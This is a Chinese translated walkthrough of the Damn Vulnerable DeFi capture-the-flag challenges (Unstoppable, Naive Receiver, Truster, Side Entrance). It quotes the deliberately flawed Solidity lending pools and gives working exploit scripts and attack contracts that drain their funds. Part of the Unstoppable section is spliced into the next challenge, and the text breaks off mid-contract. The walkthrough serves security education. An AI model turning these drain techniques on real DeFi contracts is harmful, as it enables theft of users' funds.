# Damn Vulnerable DeFi 题解
|
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## 前言
[OpenZeppelin](https://openzeppelin.com/) 设计的关于 DeFi
的八道题目，做起来挺有意思的，特定分享一下解题过程，挑战地址：
###  DeFi
DeFi 是 decentralized finance 的缩写，所谓去中心化金融，是指旨在破坏金融中间机构的各种加密货币或区块链金融应用的总称。
## 解题流程
  1. 克隆[仓库](https://github.com/OpenZeppelin/damn-vulnerable-defi/tree/v1.0.0)
  2. 使用 `npm install` 安装依赖
  3. 在 test 文件夹里，每个不同的题目文件夹里有着对应的 `*.challenge.js`，我们需要完成里面留空的代码
  4. 运行 `npm run challenge-name` 测试我们构造的 exploit 能否成功利用
## Unstoppable
> There’s a lending pool with a million DVT tokens in balance, offering flash
> loans for free.
>
> If only there was a way to attack and stop the pool from offering flash
> loans …
>
> You start with 100 DVT tokens in balance.
第一道属于签到难度，主要让玩家熟悉如何完成操作。下面来看提供借贷功能的合约：
    contract UnstoppableLender is ReentrancyGuard {
        using SafeMath for uint256;
        IERC20 public damnValuableToken;
        uint256 public poolBalance;
        constructor(address tokenAddress) public {
            require(tokenAddress != address(0), "Token address cannot be zero");
            damnValuableToken = IERC20(tokenAddress);
        }
        function depositTokens(uint256 amount) external nonReentrant {
            require(amount > 0, "Must deposit at least one token");
            // Transfer token from sender. Sender must have first approved them.
            damnValuableToken.transferFrom(msg.sender, address(this), amount);
            poolBalance = poolBalance.add(amount);
        }
        function flashLoan(uint256 borrowAmount) external nonReentrant {
            require(borrowAmount > 0, "Must borrow at least one token");
            uint256 balanceBefore = damnValuableToken.balanceOf(address(this));
            require(balanceBefore >= borrowAmount, "Not enough tokens in pool");
            // Ensured by the protocol via the `depositTokens` function
            assert(poolBalance == balanceBefore);
            damnValuableToken.transfer(msg.sender, borrowAmount);
            IReceiver(msg.sender).receiveTokens(address(damnValuableToken), borrowAmount);
            uint256 balanceAfter = damnValuableToken.balanceOf(address(this));
            require(balanceAfter >= balanceBefore, "Flash loan hasn't been paid back");
        }
    }
可以看到条件 `assert(poolBalance == balanceBefore);` 设计的非常奇怪，特别是 `poolBalance` 只会在
`depositTokens()` 被调用的时候增加，这意味着如果通过 ERC20 标准的 transfer 将 token 转移到 pool
上时，`balanceBefore` 会增加，因为余额增加了，但 `poolBalance` 不会增加， `poolBalance  There’s a lending pool offering quite expensive flash loans of Ether, which
> has 1000 ETH in balance.
>
> You also see that a user has deployed a contract with 10 ETH in balance,
> capable of interacting with the lending pool and receiveing flash loans of
> ETH.
>
> Drain all ETH funds from the user’s contract. Doing it in a single
> transaction is a big plus 😉
本题要求我们清空用户合约中的全部余额，阅读 `NaiveReceiverLenderPool` 的源代码：
    contract NaiveReceiverLenderPool is ReentrancyGuard {
        using SafeMath for uint256;
        using Address for address;
        uint256 private constant FIXED_FEE = 1 ether; // not the cheapest flash loan
        function fixedFee() external pure returns (uint256) {
            return FIXED_FEE;
        }
        function flashLoan(address payable borrower, uint256 borrowAmount) external nonReentrant {
            uint256 balanceBefore = address(this).balance;
            require(balanceBefore >= borrowAmount, "Not enough ETH in pool");
            require(address(borrower).isContract(), "Borrower must be a deployed contract");
            // Transfer ETH and handle control to receiver
            (bool success, ) = borrower.call{value: borrowAmount}(
                abi.encodeWithSignature(
                    "receiveEther(uint256)",
                    FIXED_FEE
                )
            );
            require(success, "External call failed");
            require(
                address(this).balance >= balanceBefore.add(FIXED_FEE),
                "Flash loan hasn't been paid back"
            );
        }
        // Allow deposits of ETH
        receive () external payable {}
    }
很明显调用一次 `flashLoan()` 就可以让合约账户减少 1 ETH，那么持续调用即可顺利清空合约：
    it('Exploit', async function () {
        while(await balance.current(this.receiver.address) > 0) {
            await this.pool.flashLoan(this.receiver.address, 0);
        }
    });
不过单次交易的方法需要更长的时间，更简单的方法是直接写一个攻击的合约并调用：
    pragma solidity ^0.6.0;
    contract AttackReceiver {
        function attack(address payable pool, address payable receiver) public {
            while(receiver.balance > 0) {
                (bool success, ) = pool.call(
                    abi.encodeWithSignature(
                        "flashLoan(address,uint256)",
                        receiver,
                        0
                    )
                );
                require(success, "External call failed");
            }
        }
    }
    const AttackReceiver = contract.fromArtifact('AttackReceiver');
    it('Exploit', async function () {
        const attack = await AttackReceiver.new();
        await attack.attack(this.pool.address, this.receiver.address, { from: attacker });
    }
## Truster
> More and more lending pools are offering flash loans. In this case, a new
> pool has launched that is offering flash loans of DVT tokens for free.
>
> Currently the pool has 1 million DVT tokens in balance. And you have
> nothing.
>
> But don’t worry, you might be able to steal them all from the pool.
本题要求获得贷款池中的全部余额，合约本身很简单：
    pragma solidity ^0.6.0;
    import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
    import "@openzeppelin/contracts/utils/ReentrancyGuard.sol";
    contract TrusterLenderPool is ReentrancyGuard {
        IERC20 public damnValuableToken;
        constructor (address tokenAddress) public {
            damnValuableToken = IERC20(tokenAddress);
        }
        function flashLoan(
            uint256 borrowAmount,
            address borrower,
            address target,
            bytes calldata data
        )
            external
            nonReentrant
        {
            uint256 balanceBefore = damnValuableToken.balanceOf(address(this));
            require(balanceBefore >= borrowAmount, "Not enough tokens in pool");
            damnValuableToken.transfer(borrower, borrowAmount);
            (bool success, ) = target.call(data);
            require(success, "External call failed");
            uint256 balanceAfter = damnValuableToken.balanceOf(address(this));
            require(balanceAfter >= balanceBefore, "Flash loan hasn't been paid back");
        }
    }
可以看到合约使用了 call 来实现任意交易的调用，但这也意味着极大的安全隐患，我们可以让合约执行任意的操作，比如调用 `approve()`
函数，允许我们从合约账户上进行转账，这里不直接调用 `tranfser()` 函数的原因是调用完成后不能满足 `balanceAfter >=
balanceBefore` 的要求。
解决的思路也非常直接，利用 abi 编码 data 后，像贷款池调用 `flashLoan()` 租借 0 元，然后等待合约执行完成 `approve()`
函数，然后直接从 token 处取走相应的金额：
    it('Exploit', async function () {
        const data = web3.eth.abi.encodeFunctionCall({
            name: 'approve',
            type: 'function',
            inputs: [{
                type: 'address',
                name: 'spender'
            },{
                type: 'uint256',
                name: 'amount'
            }]
        }, [attacker, TOKENS_IN_POOL.toString()]); 
        await this.pool.flashLoan(0, attacker, this.token.address, data);
        await this.token.transferFrom(this.pool.address, attacker, TOKENS_IN_POOL, { from: attacker });
    });
## Side entrance
> A surprisingly simple lending pool allows anyone to deposit ETH, and
> withdraw it at any point in time.
>
> This very simple lending pool has 1000 ETH in balance already, and is
> offering free flash loans using the deposited ETH to promote their system.
>
> You must steal all ETH from the lending pool.
本题考点同样是从贷款池中提走全部的 token，但不同于上题的直接提供 `call` 进行调用，本题限定了只能调用 receiver 的
`execute()` 函数：
    interface IFlashLoanEtherReceiver {
        function execute() external payable;
    }
    contract SideEntranceLenderPool {
        using Address for address payable;
        mapping (address => uint256) private balances;
        function deposit() external payable {
            balances[msg.sender] += msg.value;
        }
        function withdraw() external {
            uint256 amountToWithdraw = balances[msg.sender];
            balances[msg.sender] = 0;
            msg.sender.sendValue(amountToWithdraw);
        }
        function flashLoan(uint256 amount) external {
            uint256 balanceBefore = address(this).balance;
            require(balanceBefore >= amount, "Not enough ETH in balance");
            IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();
            require(address(this).balance >= balanceBefore, "Flash loan hasn't been paid back");        
        }
    }
但仔细审计源代码之后发现本题的漏洞也非常明显，如果从贷款池中借出一定量的 ETH 并通过 `deposit()` 函数将这部分 ETH 存入，那么在满足
`address(this).balance >= balanceBefore` 的同时，`balances[msg.sender]`
也会增加。然后我们再通过 `withdraw()` 函数取出，即可顺利提空贷款池中的内部金额。根据逻辑构造攻击合约：
    interface IFlashLoanEtherReceiver {
        function execute() external payable;
    }
    interface ISideEntranceLenderPool {
        function deposit() external payable;
        function withdraw() external;
        function flashLoan(uint256 amount) external;
    }
    contract AttackSideEntrance is IFlashLoanEtherReceiver {
        using Address for address payable;
        ISideEntranceLenderPool pool;
        function attack(ISideEntranceLenderPool _pool) public {
            pool = _pool;
            pool.flashLoan(address(_pool).balance);
            pool.withdraw();
            msg.sender.sendValue(address(this).balance);
        }
        function execute() external payable override {